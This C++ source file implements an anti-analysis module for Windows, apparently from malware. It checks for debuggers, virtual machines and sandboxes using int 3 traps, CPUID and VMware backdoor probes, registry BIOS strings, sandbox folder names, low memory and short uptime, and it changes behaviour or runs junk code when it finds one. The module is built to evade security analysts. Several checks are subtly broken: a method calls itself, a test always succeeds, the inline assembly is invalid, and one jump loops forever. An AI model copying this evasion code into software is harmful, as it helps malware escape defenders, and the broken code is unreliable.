#include "security/AntiAnalysis.h"
#include "core/Logger.h"
#include "utils/SystemUtils.h"
#include <Windows.h>
#include <string>
#include <vector>

// Obfuscated strings
constexpr auto OBF_ANTI_ANALYSIS = OBFUSCATE("AntiAnalysis");
constexpr auto OBF_DEBUGGER_DETECTED = OBFUSCATE("Debugger detected: %s");
constexpr auto OBF_VM_DETECTED = OBFUSCATE("VM detected: %s");
constexpr auto OBF_SANDBOX_DETECTED = OBFUSCATE("Sandbox detected: %s");

bool AntiAnalysis::IsDebuggerPresent() {
    std::vector<bool(*)(void)> checks = {
        []() -> bool { return !!IsDebuggerPresent(); },
        []() -> bool {
            HMODULE hModule = GetModuleHandleA("kernel32.dll");
            return hModule && GetProcAddress(hModule, "IsDebuggerPresent");
        },
        []() -> bool {
            __try {
                __asm { int 3 }
                return false;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                return true;
            }
        },
        []() -> bool {
            HANDLE hProcess = GetCurrentProcess();
            BOOL isDebugged = FALSE;
            return CheckRemoteDebuggerPresent(hProcess, &isDebugged) && isDebugged;
        }
    };

    for (const auto& check : checks) {
        if (check()) {
            LOG_WARN("Debugger detected");
            return true;
        }
    }
    return false;
}

bool AntiAnalysis::IsRunningInVM() {
    std::vector<bool(*)(void)> checks = {
        // CPUID-based check
        []() -> bool {
            __try {
                __asm {
                    mov eax, 0x40000000
                    cpuid
                    mov esi, ebx
                    mov edi, ecx
                    mov ebp, edx
                }
                // Check for VMware/VirtualPC hypervisor strings
                if (esi == 'VMwa' || edi == 'VMwa' || ebp == 'VMwa' ||
                    esi == 'Micr' || edi == 'osoft' || ebp == 'Virt') {
                    return true;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                return false;
            }
            return false;
        },
        // Registry-based checks
        []() -> bool {
            HKEY hKey;
            const char* vmKeys[] = {
                "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier",
                "HARDWARE\\Description\\System\\SystemBiosVersion",
                "HARDWARE\\Description\\System\\VideoBiosVersion"
            };

            for (const auto& key : vmKeys) {
                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                    char buffer[256];
                    DWORD size = sizeof(buffer);
                    if (RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                        std::string value(buffer);
                        if (value.find("VMware") != std::string::npos ||
                            value.find("Virtual") != std::string::npos ||
                            value.find("Xen") != std::string::npos ||
                            value.find("QEMU") != std::string::npos) {
                            RegCloseKey(hKey);
                            return true;
                        }
                    }
                    RegCloseKey(hKey);
                }
            }
            return false;
        },
        // Memory space check
        []() -> bool {
            __try {
                __asm {
                    push edx
                    push ecx
                    push ebx
                    mov eax, 'VMXh'
                    mov ebx, 0
                    mov ecx, 10
                    mov edx, 'VX'
                    in eax, dx
                    pop ebx
                    pop ecx
                    pop edx
                }
                return true;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                return false;
            }
        }
    };

    for (const auto& check : checks) {
        if (check()) {
            LOG_WARN("Virtual machine detected");
            return true;
        }
    }
    return false;
}

bool AntiAnalysis::IsSandboxed() {
    std::vector<bool(*)(void)> checks = {
        // Check for sandbox-specific artifacts
        []() -> bool {
            const char* sandboxPaths[] = {
                "C:\\analysis",
                "C:\\sandbox",
                "C:\\malware",
                "C:\\sample"
            };

            for (const auto& path : sandboxPaths) {
                if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
                    return true;
                }
            }
            return false;
        },
        // Check for small amount of memory
        []() -> bool {
            MEMORYSTATUSEX memStatus;
            memStatus.dwLength = sizeof(memStatus);
            GlobalMemoryStatusEx(&memStatus);
            return memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024); // Less than 2GB
        },
        // Check for recent system uptime
        []() -> bool {
            return GetTickCount64() < (2 * 60 * 60 * 1000); // Less than 2 hours
        }
    };

    for (const auto& check : checks) {
        if (check()) {
            LOG_WARN("Sandbox environment detected");
            return true;
        }
    }
    return false;
}

void AntiAnalysis::EvadeAnalysis() {
    // Add random delays
    utils::TimeUtils::JitterSleep(1000, 0.5);

    // Perform benign activities
    volatile int junk = 0;
    for (int i = 0; i < 1000; i++) {
        junk += i * i;
    }

    // Check system resources
    if (IsLowOnResources()) {
        LOG_INFO("System resources low, delaying execution");
        utils::TimeUtils::JitterSleep(5000, 0.3);
    }
}

bool AntiAnalysis::IsLowOnResources() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    
    return memStatus.dwMemoryLoad > 90 || // Memory usage > 90%
           memStatus.ullAvailPhys < (512 * 1024 * 1024); // Less than 512MB available
}

void AntiAnalysis::Countermeasure() {
    if (IsDebuggerPresent()) {
        LOG_ERROR("Debugger detected, taking countermeasures");
        // Mislead debugger by executing garbage code
        __try {
            __asm {
                jmp $+2
                nop
                nop
                jmp $-2
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    if (IsRunningInVM() || IsSandboxed()) {
        LOG_WARN("Analysis environment detected, altering behavior");
        // Implement environment-specific behavior changes
    }
}